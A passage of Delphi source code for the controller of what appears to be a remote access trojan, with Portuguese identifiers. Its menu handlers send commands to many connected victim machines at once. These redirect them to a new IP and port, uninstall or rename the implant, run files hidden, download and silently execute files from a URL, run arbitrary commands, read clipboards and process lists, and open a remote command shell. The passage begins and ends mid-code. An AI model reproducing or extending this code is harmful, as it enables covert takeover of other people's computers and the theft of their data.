    StatusBar1.Panels.Items[0].Text,
    bitInfo, 10);
end;

procedure TFormPrincipal.Reconnect1Click(Sender: TObject);
var
  i, Server, xporta: integer;
  name, xIP: string;
  ConAux: PConexao;
begin
  application.ProcessMessages;
  if listview1.Selected = nil then exit;
  name := LastReconnectIP;
  if inputquery(pchar(traduzidos[122]), pchar(traduzidos[123]) + #13#10 + '(Ex.: 127.0.0.1:81)', name) then
  begin
    xIP := copy(name, 1, pos(':', name) - 1);
    delete(name, 1, pos(':', name));
    try
      xPorta := strtoint(name);
      except
      MessageDlg(pchar(traduzidos[34]), mtWarning, [mbOK], 0);
      exit;
    end;

    if (xporta < 1) or (xporta > 65535) then
    begin
      MessageDlg(pchar(traduzidos[34]), mtWarning, [mbOK], 0);
      exit;
    end;

    LastReconnectIP := xIP + ':' + inttostr(xporta);

    if Listview1.SelCount = 1 then
    begin
      Server := GetUserSelecionado;
      if server <> - 1 then
      begin
        ConAux := PConexao(conn[server]);
        ConAux.AThread.Connection.CheckForDisconnect(False, true);
        ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
        if ConAux.AThread.Connection.ClosedGracefully = true then exit;
        if ConAux.Athread.Connection.Connected = false then exit;

        EnviarString(ConAux.Athread, RECONNECT + '|' + LastReconnectIP + '|', true);
        try
          ConAux.Athread.Connection.Disconnect;
          except
         {$IFDEF SPYDEBUG} AddDebug(Erro42); {$ENDIF}
        end;
      end else
      messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    end else
    begin
      for i := (Conn.Count - 1) downto 0 do
      try
        application.ProcessMessages;

        ConAux := PConexao(conn[i]);
        ConAux.AThread.Connection.CheckForDisconnect(False, true);
        ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
        if ConAux.AThread.Connection.ClosedGracefully = true then continue;
        if ConAux.Athread.Connection.Connected = false then continue;

        if ConAux.Item <> nil then
        if ConAux.Item.Selected = true then
        begin
          sleep(5);
          EnviarString(ConAux.Athread, RECONNECT + '|' + LastReconnectIP + '|', true);
          try
            ConAux.Athread.Connection.Disconnect;
            except
           {$IFDEF SPYDEBUG} AddDebug(Erro43); {$ENDIF}
          end;
        end;
        except
      end;
    end;
  end;
end;

procedure TFormPrincipal.Disconnect1Click(Sender: TObject);
var
  i, j, Server: integer;
  ConAux: PConexao;
begin
  application.ProcessMessages;
  if messagedlg(pchar(traduzidos[124]), mtConfirmation, [mbYes, mbNo], 0) = IdNo then exit;

  if Listview1.SelCount = 1 then
  begin
    Server := GetUserSelecionado;
    if server <> - 1 then
    begin
      ConAux := PConexao(conn[server]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then exit;
      if ConAux.Athread.Connection.Connected = false then exit;

      EnviarString(ConAux.Athread, DISCONNECT + '|', true);
    end else messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
  end else
  begin
    for i := (Conn.Count - 1) downto 0 do
    try
      application.ProcessMessages;

      ConAux := PConexao(conn[i]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then continue;
      if ConAux.Athread.Connection.Connected = false then continue;

      if ConAux.Item <> nil then
      if ConAux.Item.Selected = true then
      begin
        sleep(5);
        EnviarString(ConAux.Athread, DISCONNECT + '|', true);
      end;
      except
    end;    
  end;
end;

procedure TFormPrincipal.Uninstall1Click(Sender: TObject);
var
  i, j, Server: integer;
  ConAux: PConexao;
begin
  application.ProcessMessages;
  if messagedlg(pchar(traduzidos[126]), mtConfirmation, [mbYes, mbNo], 0) = IdNo then exit;

  if Listview1.SelCount = 1 then
  begin
    Server := GetUserSelecionado;
    if server <> - 1 then
    begin
      ConAux := PConexao(conn[server]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then exit;
      if ConAux.Athread.Connection.Connected = false then exit;
      EnviarString(ConAux.Athread, UNINSTALL + '|', true);
    end else messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
  end else
  begin
    for i := (Conn.Count - 1) downto 0 do
    try
      application.ProcessMessages;

      ConAux := PConexao(conn[i]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then continue;
      if ConAux.Athread.Connection.Connected = false then continue;

      if ConAux.Item <> nil then
      if ConAux.Item.Selected = true then
      begin
        sleep(5);
        EnviarString(ConAux.Athread, UNINSTALL + '|', true);
      end;
      except
    end;
  end;
end;

procedure TFormPrincipal.Rename1Click(Sender: TObject);
var
  i, j, Server: integer;
  name: string;
  ConAux: PConexao;
begin
  application.ProcessMessages;
  name := LastRenameName;
  if inputquery(pchar(traduzidos[129]), pchar(traduzidos[130]), name) then
  begin
    if messagedlg(pchar(traduzidos[128]), mtConfirmation, [mbYes, mbNo], 0) = IdNo then exit;
    LastRenameName := name;

    if Listview1.SelCount = 1 then
    begin
      Server := GetUserSelecionado;
      if server <> - 1 then
      begin
        ConAux := PConexao(conn[server]);
        ConAux.AThread.Connection.CheckForDisconnect(False, true);
        ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
        if ConAux.AThread.Connection.ClosedGracefully = true then exit;
        if ConAux.Athread.Connection.Connected = false then exit;

        EnviarString(ConAux.Athread, RENAMESERVIDOR + '|' + LastRenameName + '|', true);
      end else
      messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    end else
    begin
      for i := (Conn.Count - 1) downto 0 do
      try
        application.ProcessMessages;

        ConAux := PConexao(conn[i]);
        ConAux.AThread.Connection.CheckForDisconnect(False, true);
        ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
        if ConAux.AThread.Connection.ClosedGracefully = true then continue;
        if ConAux.Athread.Connection.Connected = false then continue;

        if ConAux.Item <> nil then
        if ConAux.Item.Selected = true then
        begin
          sleep(5);
          EnviarString(ConAux.Athread, RENAMESERVIDOR + '|' + LastRenameName + '|', true);
        end;
        except
      end;
    end;
  end;
end;   

procedure TFormPrincipal.Timer2Timer(Sender: TObject);
var
  i: integer;
  ToSend: string;
  AtualizarPing: boolean;
begin
  if EnviandoPing = true then exit;
  if listview1.Items.Count <= 0 then exit;

  if PodeSolicitarImgDesk = false then ToSend := PING + '|' else ToSend := PING + '|' + IMGDESK + '|';
  PodeSolicitarImgDesk := false;

  EnviandoPing := true;

  for i := (Conn.Count - 1) downto 0 do
  begin
    if (PConexao(conn[i]).Item <> nil) and (PConexao(conn[i]).Athread.Data <> nil) then
    try
      application.ProcessMessages;
      try
        AtualizarPing := true;
        if GetTickCount > PConexao(conn[i]).Ping + (35000 + 35000 + 35000) then
        begin
          {$IFDEF SPYDEBUG} AddDebug(Erro52); {$ENDIF}
          PConexao(conn[i]).Athread.Connection.Disconnect;
        end else
        try
          //sleep(5); acho que estava causando um atraso nos outros comandos pq a função enviarstring depende do "EnviandoPing"
          PConexao(conn[i]).Athread.Connection.WriteLn(ToSend);
          except
          AtualizarPing := false;
        end;
        except
        AtualizarPing := false;
        {$IFDEF SPYDEBUG} AddDebug(Erro7); {$ENDIF}
        PConexao(conn[i]).Athread.Connection.Disconnect;
      end;
      if AtualizarPing = true then PConexao(conn[i]).Ping := GetTickCount;
      PConexao(conn[i]).item.SubItemImages[0] := 329;
      except
     {$IFDEF SPYDEBUG} AddDebug(Erro8); {$ENDIF}
    end;
  end;

  EnviandoPing := false;
end;

procedure TFormPrincipal.Normal1Click(Sender: TObject);
var
  FileName: string;
  ConAux: PConexao;
  server, i: integer;
begin
  application.ProcessMessages;
  opendialog1.Filter := 'All Files (*.*)' + '|*.*';
  opendialog1.InitialDir := extractfilepath(paramstr(0));
  opendialog1.Title := Application.Title + ' ' + VersaoPrograma;

  if opendialog1.Execute = false then exit;

  FileName := opendialog1.FileName;

  if Listview1.SelCount = 1 then
  begin
    Server := GetUserSelecionado;
    if server <> - 1 then
    begin
      ConAux := PConexao(conn[server]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then exit;
      if ConAux.Athread.Connection.Connected = false then exit;
      EnviarString(ConAux.Athread, ENVIAREXECNORMAL + '|' + FileName + '|', true);
    end else
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
  end else
  begin
    for i := (Conn.Count - 1) downto 0 do
    try
      application.ProcessMessages;

      ConAux := PConexao(conn[i]);
      ConAux := PConexao(conn[i]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then continue;
      if ConAux.Athread.Connection.Connected = false then continue;
      if ConAux.Item <> nil then
      if ConAux.Item.Selected = true then
      begin
        sleep(5);
        EnviarString(ConAux.Athread, ENVIAREXECNORMAL + '|' + FileName + '|', true);
      end;
      except
    end;
  end;
end;

procedure TFormPrincipal.Hidden1Click(Sender: TObject);
var
  FileName: string;
  ConAux: PConexao;
  server, i: integer;
begin
  application.ProcessMessages;
  opendialog1.Filter := 'All Files (*.*)' + '|*.*';
  opendialog1.InitialDir := extractfilepath(paramstr(0));
  opendialog1.Title := Application.Title + ' ' + VersaoPrograma;

  if opendialog1.Execute = false then exit;

  FileName := opendialog1.FileName;

  if Listview1.SelCount = 1 then
  begin
    Server := GetUserSelecionado;
    if server <> - 1 then
    begin
      ConAux := PConexao(conn[server]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then exit;
      if ConAux.Athread.Connection.Connected = false then exit;
      EnviarString(ConAux.Athread, ENVIAREXECHIDDEN + '|' + FileName + '|', true);
    end else
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
  end else
  begin
    for i := (Conn.Count - 1) downto 0 do
    try
      application.ProcessMessages;

      ConAux := PConexao(conn[i]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then continue;
      if ConAux.Athread.Connection.Connected = false then continue;
      if ConAux.Item <> nil then
      if ConAux.Item.Selected = true then
      begin
        sleep(5);
        EnviarString(ConAux.Athread, ENVIAREXECHIDDEN + '|' + FileName + '|', true);
      end;
      except
    end;
  end;
end;

procedure TFormPrincipal.Notificaovisual1Click(Sender: TObject);
begin
  Notificaovisual1.Checked := not Notificaovisual1.Checked;
end;

procedure TFormPrincipal.Notificaosonora1Click(Sender: TObject);
begin
  Notificaosonora1.Checked := not Notificaosonora1.Checked;
end;

procedure TFormPrincipal.Listadeprocessos1Click(Sender: TObject);
var
  Server: integer;
  NovaJanelaFuncoesDiversas: TFormFuncoesDiversas;
  ConAux: PConexao;
  i: integer;
begin
  application.ProcessMessages;
  Server := GetUserSelecionado;
  if server <> - 1 then
  begin
    ConAux := PConexao(conn[server]);
    ConAux.AThread.Connection.CheckForDisconnect(False, true);
    ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
    if ConAux.AThread.Connection.ClosedGracefully = true then exit;
    if ConAux.Athread.Connection.Connected = false then exit;
  end else
  begin
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    exit;
  end;

  if ConAux.Forms[0] <> nil then
  begin
    TFormFuncoesDiversas(ConAux.Forms[0]).PageControl1.ActivePage := TFormFuncoesDiversas(ConAux.Forms[0]).TabSheet1;
    TFormFuncoesDiversas(ConAux.Forms[0]).Show;
    TFormFuncoesDiversas(ConAux.Forms[0]).Caption := ConAux.Item.SubItems.Strings[0];
  end
  else
  begin
    NovaJanelaFuncoesDiversas := TFormFuncoesDiversas.Create(self, ConAux);
    NovaJanelaFuncoesDiversas.FormStyle := fsStayOnTop;
    ConAux.Forms[0] := NovaJanelaFuncoesDiversas;
    NovaJanelaFuncoesDiversas.Caption := ConAux.Item.SubItems.Strings[0];
    TFormFuncoesDiversas(ConAux.Forms[0]).PageControl1.ActivePage := TFormFuncoesDiversas(ConAux.Forms[0]).TabSheet1;
    i := gettickcount;
    while gettickcount < i + 200 do application.ProcessMessages;
    NovaJanelaFuncoesDiversas.Show;
  end;
end;

procedure TFormPrincipal.ListView1ColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: integer;
begin
  if (SortColumn = Column.Index) then
    SortReverse := not SortReverse //reverse the sort order since this column is already selected for sorting
  else
  begin
    SortColumn := Column.Index;
    SortReverse := false;
  end;
  ListView1.CustomSort(nil, 0);
end;

procedure TFormPrincipal.ListView1Compare(Sender: TObject; Item1,
  Item2: TListItem; Data: Integer; var Compare: Integer);
begin
  if SortColumn = 0 then
    Compare := AnsiCompareStr(Item1.Caption, Item2.Caption)
  else
    Compare := AnsiCompareStr(Item1.SubItems[SortColumn-1], Item2.SubItems[SortColumn-1]);
  if SortReverse then Compare := 0 - Compare;
end;

procedure TFormPrincipal.Listadeservios1Click(Sender: TObject);
var
  Server: integer;
  NovaJanelaFuncoesDiversas: TFormFuncoesDiversas;
  ConAux: PConexao;
  i: integer;
begin
  application.ProcessMessages;
  Server := GetUserSelecionado;
  if server <> - 1 then
  begin
    ConAux := PConexao(conn[server]);
    ConAux.AThread.Connection.CheckForDisconnect(False, true);
    ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
    if ConAux.AThread.Connection.ClosedGracefully = true then exit;
    if ConAux.Athread.Connection.Connected = false then exit;
  end else
  begin
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    exit;
  end;
  if ConAux.Forms[0] <> nil then
  begin
    TFormFuncoesDiversas(ConAux.Forms[0]).PageControl1.ActivePage := TFormFuncoesDiversas(ConAux.Forms[0]).TabSheet2;
    TFormFuncoesDiversas(ConAux.Forms[0]).Show;
    TFormFuncoesDiversas(ConAux.Forms[0]).Caption := ConAux.Item.SubItems.Strings[0];
  end
  else
  begin
    NovaJanelaFuncoesDiversas := TFormFuncoesDiversas.Create(self, ConAux);
    NovaJanelaFuncoesDiversas.FormStyle := fsStayOnTop;
    ConAux.Forms[0] := NovaJanelaFuncoesDiversas;
    TFormFuncoesDiversas(ConAux.Forms[0]).PageControl1.ActivePage := TFormFuncoesDiversas(ConAux.Forms[0]).TabSheet2;
    i := gettickcount;
    while gettickcount < i + 200 do application.ProcessMessages;
    NovaJanelaFuncoesDiversas.Show;
    NovaJanelaFuncoesDiversas.Caption := ConAux.Item.SubItems.Strings[0];
  end;
end;

procedure TFormPrincipal.Listadejanelas1Click(Sender: TObject);
var
  Server: integer;
  NovaJanelaFuncoesDiversas: TFormFuncoesDiversas;
  ConAux: PConexao;
  i: integer;
begin
  application.ProcessMessages;
  Server := GetUserSelecionado;
  if server <> - 1 then
  begin
    ConAux := PConexao(conn[server]);
    ConAux.AThread.Connection.CheckForDisconnect(False, true);
    ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
    if ConAux.AThread.Connection.ClosedGracefully = true then exit;
    if ConAux.Athread.Connection.Connected = false then exit;
  end else
  begin
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    exit;
  end;
  if ConAux.Forms[0] <> nil then
  begin
    TFormFuncoesDiversas(ConAux.Forms[0]).PageControl1.ActivePage := TFormFuncoesDiversas(ConAux.Forms[0]).TabSheet3;
    TFormFuncoesDiversas(ConAux.Forms[0]).Show;
    TFormFuncoesDiversas(ConAux.Forms[0]).Caption := ConAux.Item.SubItems.Strings[0];
  end
  else
  begin
    NovaJanelaFuncoesDiversas := TFormFuncoesDiversas.Create(self, ConAux);
    NovaJanelaFuncoesDiversas.FormStyle := fsStayOnTop;
    ConAux.Forms[0] := NovaJanelaFuncoesDiversas;
    TFormFuncoesDiversas(ConAux.Forms[0]).PageControl1.ActivePage := TFormFuncoesDiversas(ConAux.Forms[0]).TabSheet3;
    i := gettickcount;
    while gettickcount < i + 200 do application.ProcessMessages;
    NovaJanelaFuncoesDiversas.Show;
    NovaJanelaFuncoesDiversas.Caption := ConAux.Item.SubItems.Strings[0];
  end;
end;

procedure TFormPrincipal.Listadeprogramasinstalados1Click(Sender: TObject);
var
  Server: integer;
  NovaJanelaFuncoesDiversas: TFormFuncoesDiversas;
  ConAux: PConexao;
  i: integer;
begin
  application.ProcessMessages;
  Server := GetUserSelecionado;
  if server <> - 1 then
  begin
    ConAux := PConexao(conn[server]);
    ConAux.AThread.Connection.CheckForDisconnect(False, true);
    ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
    if ConAux.AThread.Connection.ClosedGracefully = true then exit;
    if ConAux.Athread.Connection.Connected = false then exit;
  end else
  begin
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    exit;
  end;
  if ConAux.Forms[0] <> nil then
  begin
    TFormFuncoesDiversas(ConAux.Forms[0]).PageControl1.ActivePage := TFormFuncoesDiversas(ConAux.Forms[0]).TabSheet4;
    TFormFuncoesDiversas(ConAux.Forms[0]).Show;
    TFormFuncoesDiversas(ConAux.Forms[0]).Caption := ConAux.Item.SubItems.Strings[0];
  end
  else
  begin
    NovaJanelaFuncoesDiversas := TFormFuncoesDiversas.Create(self, ConAux);
    NovaJanelaFuncoesDiversas.FormStyle := fsStayOnTop;
    ConAux.Forms[0] := NovaJanelaFuncoesDiversas;
    TFormFuncoesDiversas(ConAux.Forms[0]).PageControl1.ActivePage := TFormFuncoesDiversas(ConAux.Forms[0]).TabSheet4;
    i := gettickcount;
    while gettickcount < i + 200 do application.ProcessMessages;
    NovaJanelaFuncoesDiversas.Show;
    NovaJanelaFuncoesDiversas.Caption := ConAux.Item.SubItems.Strings[0];
  end;
end;

procedure TFormPrincipal.Listarportasativas1Click(Sender: TObject);
var
  Server: integer;
  NovaJanelaFuncoesDiversas: TFormFuncoesDiversas;
  ConAux: PConexao;
  i: integer;
begin
  application.ProcessMessages;
  Server := GetUserSelecionado;
  if server <> - 1 then
  begin
    ConAux := PConexao(conn[server]);
    ConAux.AThread.Connection.CheckForDisconnect(False, true);
    ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
    if ConAux.AThread.Connection.ClosedGracefully = true then exit;
    if ConAux.Athread.Connection.Connected = false then exit;
  end else
  begin
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    exit;
  end;
  if ConAux.Forms[0] <> nil then
  begin
    TFormFuncoesDiversas(ConAux.Forms[0]).PageControl1.ActivePage := TFormFuncoesDiversas(ConAux.Forms[0]).TabSheet5;
    TFormFuncoesDiversas(ConAux.Forms[0]).Show;
    TFormFuncoesDiversas(ConAux.Forms[0]).Caption := ConAux.Item.SubItems.Strings[0];
  end
  else
  begin
    NovaJanelaFuncoesDiversas := TFormFuncoesDiversas.Create(self, ConAux);
    NovaJanelaFuncoesDiversas.FormStyle := fsStayOnTop;
    ConAux.Forms[0] := NovaJanelaFuncoesDiversas;
    TFormFuncoesDiversas(ConAux.Forms[0]).PageControl1.ActivePage := TFormFuncoesDiversas(ConAux.Forms[0]).TabSheet5;
    i := gettickcount;
    while gettickcount < i + 200 do application.ProcessMessages;
    NovaJanelaFuncoesDiversas.Show;
    NovaJanelaFuncoesDiversas.Caption := ConAux.Item.SubItems.Strings[0];
  end;
end;

procedure TFormPrincipal.ListarDispositivos1Click(Sender: TObject);
var
  Server: integer;
  NovaJanelaDispositivos: TFormListarDispositivos;
  ConAux: PConexao;
  i: integer;
begin
  application.ProcessMessages;
  Server := GetUserSelecionado;
  if server <> - 1 then
  begin
    ConAux := PConexao(conn[server]);
    ConAux.AThread.Connection.CheckForDisconnect(False, true);
    ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
    if ConAux.AThread.Connection.ClosedGracefully = true then exit;
    if ConAux.Athread.Connection.Connected = false then exit;
  end else
  begin
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    exit;
  end;
  if ConAux.Forms[1] <> nil then
  begin
    TFormListarDispositivos(ConAux.Forms[1]).Show;
    TFormListarDispositivos(ConAux.Forms[1]).Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[233];
  end
  else
  begin
    NovaJanelaDispositivos := TFormListarDispositivos.Create(self, ConAux);
    NovaJanelaDispositivos.FormStyle := fsStayOnTop;
    ConAux.Forms[1] := NovaJanelaDispositivos;
    i := gettickcount;
    while gettickcount < i + 200 do application.ProcessMessages;
    NovaJanelaDispositivos.Show;
    NovaJanelaDispositivos.Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[233];
  end;
end;

procedure TFormPrincipal.ListView1DblClick(Sender: TObject);
var
  Server: integer;
  NovaJanelaFuncoesDiversas: TFormFuncoesDiversas;
  ConAux: PConexao;
  i: integer;
begin
  if (ListView1.Selected = nil) or
     (ListView1.SelCount > 1) then exit;

  Server := GetUserSelecionado;
  if server <> - 1 then
  begin
    ConAux := PConexao(conn[server]);
    ConAux.AThread.Connection.CheckForDisconnect(False, true);
    ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
    if ConAux.AThread.Connection.ClosedGracefully = true then exit;
    if ConAux.Athread.Connection.Connected = false then exit;
  end else
  begin
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    exit;
  end;
  if ConAux.Forms[0] <> nil then
  begin
    TFormFuncoesDiversas(ConAux.Forms[0]).PageControl1.ActivePage := TFormFuncoesDiversas(ConAux.Forms[0]).TabSheet6;
    TFormFuncoesDiversas(ConAux.Forms[0]).Show;
    TFormFuncoesDiversas(ConAux.Forms[0]).Caption := ConAux.Item.SubItems.Strings[0];
  end
  else
  begin
    NovaJanelaFuncoesDiversas := TFormFuncoesDiversas.Create(self, ConAux);
    ConAux.Forms[0] := NovaJanelaFuncoesDiversas;
    NovaJanelaFuncoesDiversas.FormStyle := fsStayOnTop;
    NovaJanelaFuncoesDiversas.Caption := ConAux.Item.SubItems.Strings[0];
    NovaJanelaFuncoesDiversas.PageControl1.ActivePage := TFormFuncoesDiversas(ConAux.Forms[0]).TabSheet6;
    i := gettickcount;
    while gettickcount < i + 200 do application.ProcessMessages;
    NovaJanelaFuncoesDiversas.Show;
  end;
end;

procedure TFormPrincipal.Executarcomandos1Click(Sender: TObject);
var
  i, j, Server: integer;
  name: string;
  ConAux: PConexao;
begin
  application.ProcessMessages;
  name := LastExecutarComando;
  if inputquery(pchar(traduzidos[241]), pchar(traduzidos[242]), name) then
  begin
    LastExecutarComando := name;

    if Listview1.SelCount = 1 then
    begin
      Server := GetUserSelecionado;
      if server <> - 1 then
      begin
        ConAux := PConexao(conn[server]);
        ConAux.AThread.Connection.CheckForDisconnect(False, true);
        ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
        if ConAux.AThread.Connection.ClosedGracefully = true then exit;
        if ConAux.Athread.Connection.Connected = false then exit;

        EnviarString(ConAux.Athread, EXECUTARCOMANDOS + '|' + LastExecutarComando + '|', true);
      end else messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    end else
    begin
      for i := (Conn.Count - 1) downto 0 do
      try
        application.ProcessMessages;

        ConAux := PConexao(conn[i]);
        ConAux.AThread.Connection.CheckForDisconnect(False, true);
        ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
        if ConAux.AThread.Connection.ClosedGracefully = true then continue;
        if ConAux.Athread.Connection.Connected = false then continue;

        if ConAux.Item <> nil then
        if ConAux.Item.Selected = true then
        begin
          sleep(5);
          EnviarString(ConAux.Athread, EXECUTARCOMANDOS + '|' + LastExecutarComando + '|', true);
        end;
        except
      end;
    end;
  end;
end;

procedure TFormPrincipal.Abrirpginadainternet1Click(Sender: TObject);
var
  i, j, Server: integer;
  name: string;
  ConAux: PConexao;
begin
  application.ProcessMessages;
  name := LastWebPage;
  if inputquery(pchar(traduzidos[243]), pchar(traduzidos[244]), name) then
  begin
    LastWebPage := name;

    if Listview1.SelCount = 1 then
    begin
      Server := GetUserSelecionado;
      if server <> - 1 then
      begin
        ConAux := PConexao(conn[server]);
        ConAux.AThread.Connection.CheckForDisconnect(False, true);
        ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
        if ConAux.AThread.Connection.ClosedGracefully = true then exit;
        if ConAux.Athread.Connection.Connected = false then exit;
        EnviarString(ConAux.Athread, OPENWEB + '|' + LastWebPage + '|', true);
      end else messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    end else
    begin
      for i := (Conn.Count - 1) downto 0 do
      try
        application.ProcessMessages;

        ConAux := PConexao(conn[i]);
        ConAux.AThread.Connection.CheckForDisconnect(False, true);
        ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
        if ConAux.AThread.Connection.ClosedGracefully = true then continue;
        if ConAux.Athread.Connection.Connected = false then continue;

        if ConAux.Item <> nil then
        if ConAux.Item.Selected = true then
        begin
          sleep(5);
          EnviarString(ConAux.Athread, OPENWEB + '|' + LastWebPage + '|', true);
        end;
        except
      end;
    end;
  end;
end;

procedure TFormPrincipal.Baixararquivoeexecutar1Click(Sender: TObject);
var
  i, j, Server: integer;
  name: string;
  ExecHidden: boolean;
  ConAux: PConexao;
begin
  application.ProcessMessages;
  ExecHidden := true;
  name := LastDownloadExec;
  if inputquery(pchar(traduzidos[245]), pchar(traduzidos[246]), name) then
  begin
    if messagedlg(pchar(traduzidos[247]), mtConfirmation, [mbYes, mbNo], 0) = IdNo then ExecHidden := false;

    LastDownloadExec := name;

    if Listview1.SelCount = 1 then
    begin
      Server := GetUserSelecionado;
      if server <> - 1 then
      begin
        ConAux := PConexao(conn[server]);
        ConAux.AThread.Connection.CheckForDisconnect(False, true);
        ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
        if ConAux.AThread.Connection.ClosedGracefully = true then exit;
        if ConAux.Athread.Connection.Connected = false then exit;

        if ExecHidden = true then
        EnviarString(ConAux.Athread, DOWNEXEC + '|' + 'Y|' + LastDownloadExec + '|', true) else
        EnviarString(ConAux.Athread, DOWNEXEC + '|' + 'N|' + LastDownloadExec + '|', true);
      end else messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    end else
    begin
      for i := (Conn.Count - 1) downto 0 do
      try
        application.ProcessMessages;

        ConAux := PConexao(conn[i]);
        ConAux.AThread.Connection.CheckForDisconnect(False, true);
        ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
        if ConAux.AThread.Connection.ClosedGracefully = true then continue;
        if ConAux.Athread.Connection.Connected = false then continue;

        if ConAux.Item <> nil then
        if ConAux.Item.Selected = true then
        begin
          sleep(5);
          if ExecHidden = true then
          EnviarString(ConAux.Athread, DOWNEXEC + '|' + 'Y|' + LastDownloadExec + '|', true) else
          EnviarString(ConAux.Athread, DOWNEXEC + '|' + 'N|' + LastDownloadExec + '|', true);
        end;
        except
      end;
    end;
  end;
end;

procedure TFormPrincipal.Clipboard1Click(Sender: TObject);
var
  Server: integer;
  NovaJanelaFuncoesDiversas: TFormFuncoesDiversas;
  ConAux: PConexao;
  i: integer;
begin
  application.ProcessMessages;
  Server := GetUserSelecionado;
  if server <> - 1 then
  begin
    ConAux := PConexao(conn[server]);
    ConAux.AThread.Connection.CheckForDisconnect(False, true);
    ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
    if ConAux.AThread.Connection.ClosedGracefully = true then exit;
    if ConAux.Athread.Connection.Connected = false then exit;
  end else
  begin
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    exit;
  end;

  if ConAux.Forms[0] <> nil then
  begin
    TFormFuncoesDiversas(ConAux.Forms[0]).PageControl1.ActivePage := TFormFuncoesDiversas(ConAux.Forms[0]).TabSheet7;
    TFormFuncoesDiversas(ConAux.Forms[0]).Show;
    TFormFuncoesDiversas(ConAux.Forms[0]).Caption := ConAux.Item.SubItems.Strings[0];
  end
  else
  begin
    NovaJanelaFuncoesDiversas := TFormFuncoesDiversas.Create(self, ConAux);
    NovaJanelaFuncoesDiversas.FormStyle := fsStayOnTop;
    ConAux.Forms[0] := NovaJanelaFuncoesDiversas;
    TFormFuncoesDiversas(ConAux.Forms[0]).PageControl1.ActivePage := TFormFuncoesDiversas(ConAux.Forms[0]).TabSheet7;
    i := gettickcount;
    while gettickcount < i + 200 do application.ProcessMessages;
    NovaJanelaFuncoesDiversas.Show;
    NovaJanelaFuncoesDiversas.Caption := ConAux.Item.SubItems.Strings[0];
  end;
end;

procedure TFormPrincipal.PromptDOS1Click(Sender: TObject);
var
  Server: integer;
  NovaJanelaShell: TFormShell;
  ConAux: PConexao;
  i: integer;
begin
  application.ProcessMessages;
  Server := GetUserSelecionado;
  if server <> - 1 then
  begin
    ConAux := PConexao(conn[server]);
    ConAux.AThread.Connection.CheckForDisconnect(False, true);
    ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
    if ConAux.AThread.Connection.ClosedGracefully = true then exit;
    if ConAux.Athread.Connection.Connected = false then exit;
  end else
  begin
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
    exit;
  end;
  if ConAux.Forms[2] <> nil then
  begin
    TFormShell(ConAux.Forms[2]).Show;
    TFormShell(ConAux.Forms[2]).Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[255];
  end
  else
  begin
    NovaJanelaShell := TFormShell.Create(self, ConAux);
    NovaJanelaShell.FormStyle := fsStayOnTop;
    ConAux.Forms[2] := NovaJanelaShell;
    i := gettickcount;
    while gettickcount < i + 200 do application.ProcessMessages;
    NovaJanelaShell.Show;
